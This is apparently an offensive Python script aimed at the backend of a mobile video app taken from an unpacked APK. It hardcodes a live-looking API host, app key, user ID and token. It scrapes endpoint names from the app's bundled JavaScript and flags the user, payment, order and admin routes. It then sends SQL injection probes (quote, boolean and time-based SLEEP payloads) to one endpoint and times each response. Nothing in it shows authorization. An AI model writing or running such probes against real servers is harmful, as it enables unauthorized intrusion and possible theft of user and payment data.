# -*- coding: utf-8 -*-
import json, re, os, urllib.request, urllib.parse, time, sys

BASE = "https://heootjfch5.842644.xyz"
KEY  = "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2"
API  = BASE + "/appapi"
UID  = "94970"
TOK  = "eyJ1aWQiOjk0OTcwLCJpYXQiOjE3OTUzNjg2MjAsImV4cCI6MTc5Nzk2MDYyMCwibm9uY2UiOiJiNTQ5YzY4ZDQ3OTA3Y2M5IiwidiI6MX0.9373ed25bfd0883595f85ab8db9ee773ebf6f4a8540b582baf0d3d02732fe3bc"
HERE = os.path.dirname(os.path.abspath(__file__))
WWW  = os.path.join(HERE, "unzip", "assets", "apps", "__UNI__GF0182AE", "www")

def post(name, data, headers=None, raw=False):
    url = API + "/" + name + "/appkey/" + KEY
    hdr = {"User-Agent": "okhttp/3.12.0", "token": TOK,
           "Content-Type": "application/x-www-form-urlencoded"}
    if headers: hdr.update(headers)
    body = urllib.parse.urlencode(data).encode() if not raw else data.encode()
    r = urllib.request.Request(url, data=body, headers=hdr, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, "EXC %s" % e

def clean(h):
    t = re.sub(r"<style.*?</style>", "", h, flags=re.S)
    t = re.sub(r"<script.*?</script>", "", t, flags=re.S)
    t = re.sub(r"<[^>]+>", " ", t)
    return re.sub(r"\s+", " ", t).strip()

def dump_eps():
    src = open(os.path.join(WWW, "pages", "index", "index.js"), encoding="utf-8", errors="replace").read()
    i = src.find("apiData")
    seg = src[i:i + 40000]
    pairs = re.findall(r'([A-Za-z_][A-Za-z0-9_]*)\s*:\s*[A-Za-z_$][\w$]*\s*\+\s*"/"\s*\+\s*[A-Za-z_$][\w$]*\s*\+\s*"/([^"]+)/appkey/"', seg)
    seen = {}
    for k, v in pairs:
        seen.setdefault(k, v)
    with open("endpoints.txt", "w", encoding="utf-8") as f:
        for k in sorted(seen):
            f.write("%-28s /%s/\n" % (k, seen[k]))
    print("[endpoints] %d" % len(seen))
    return seen

if __name__ == "__main__":
    eps = dump_eps()
    # 找与用户资料/支付/订单相关的
    kw = ("user", "vip", "order", "pay", "money", "info", "edit", "update", "set", "admin", "notify", "callback")
    rel = [k for k in eps if any(w in k.lower() for w in kw)]
    print("[related]", ", ".join(rel))
    print()

    # SQL 注入探针：updateTryTime 的 videoId
    probes = [
        ("quote",       {"videoId": "50363'", "userId": UID, "time": 15}),
        ("and1",        {"videoId": "50363 and 1=1", "userId": UID, "time": 15}),
        ("sleep",       {"videoId": "50363 AND SLEEP(3)", "userId": UID, "time": 15}),
    ]
    for tag, d in probes:
        t0 = time.time()
        st, body = post("updateTryTime", d)
        dt = time.time() - t0
        print("[inj:%s] %s %.2fs %s" % (tag, st, dt, clean(body)[:300]))
